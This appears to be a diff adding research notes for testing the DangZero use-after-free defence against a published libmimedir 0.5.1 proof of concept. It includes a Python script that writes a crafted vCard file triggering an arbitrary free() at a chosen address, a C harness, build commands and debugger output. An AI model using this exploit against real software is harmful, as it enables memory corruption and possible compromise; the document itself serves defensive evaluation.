@@ -1,0 +1,82 @@
+https://packetstormsecurity.com/files/132257/Libmimedir-VCF-Memory-Corruption-Proof-Of-Concept.html
+# this exploit is an arbitrary free, meaning you can control the address that is freed()
+# download: https://sourceforge.net/projects/libmimedir/files/latest/download
+# this is libmimedir 0.5.1
+./configure
+make
+sudo make install
+# installs in /usr/local/lib/
+# I moved it into /usr/local/lib/libmimedir/
+# input: create the python script from link which creates free.vcf
+# Compile: (can add -fsanitize=address)
+# C file: 
+
+#include <stdio.h>
+#include "libmimedir.h"
+#include <unistd.h>
+#include <string.h>
+
+int main(int argc, char** argv)
+{
+//        sleep(10); // gdb attach time
+        char *num = argv[1];
+        char file[256];
+        strcpy(file, "free");
+        strcat(file, num);
+        strcat(file, ".vcf");
+        printf("target file = %s\n", file);
+
+        mdir_line** l = mdir_parse_file(file);
+        printf("result=%p\n", l);
+        return 0;
+}
+
+
+# Change DangZero: there is a dependency on which characters are allowed in the input, and
+# DangZero's default base address contains too many zeroes to trigger a free() on them
+# SHADOW_BASE = 0xffff964242400000
+# Then update the last_pt ptrs accordingly: L4 300 L3 265 L2 18 L1 0
+# Dump all the calls to malloc made by the program (resulting alias memory addresses).
+# Pick one around the end, for example: 0xffff964242439bb8
+# Update the Python POC to write 0xffff964242439bb8 instead of 0x4141414141414141
+
+def single(n):
+    mime = "begin:vcard<x\nx;type=x;type=x,"
+    mime += pack("<Q", 0xffff964242439bb8) # mdm->p
+    mime += pack("<Q", 0x4242424242424242)
+    mime += ":x>x.l:x"
+    mime += pack("<H", 0x0000) # 2 x YY_END_OF_BUFFER_CHAR
+
+    print("Writing free.vcf to local directory...")
+
+    try:
+        strout = "free" + str(n) + ".vcf"
+        with open(strout, 'wb') as outfile:
+            outfile.write(mime)
+
+    except Exception as error:
+        print("Error: %s\n" % error);
+        return
+
+def main():
+    single(1337)
+    print("Done\n")
+    return
+
+if __name__ == "__main__":
+    main()
+
+# This means 0xffff964242439bb8 will be free()
+# GDB can confirm this (without DangZero active, this free() will segfault):
+# Program received signal SIGSEGV, Segmentation fault.
+# __GI___libc_free (mem=0xffff964242439bb8) at malloc.c:3102
+# Afterwards, there is still a use of the memory, which is caught by DangZero:
+# Segfault at: 0xffff964242439bb0
+# PTE was invalidated
+# this means the free operation on the address was successful, and it segfaulted on a use 
+# because otherwise the PTE would not be marked as invalidated
+
+export LD_LIBRARY_PATH=/usr/local/lib/libmimedir
+gcc -g consume.c -o consume -L/usr/local/lib/libmimedir/ -lmimedir
+./consume 1337
+LD_PRELOAD=/trusted/wrap.so ./consume 1337
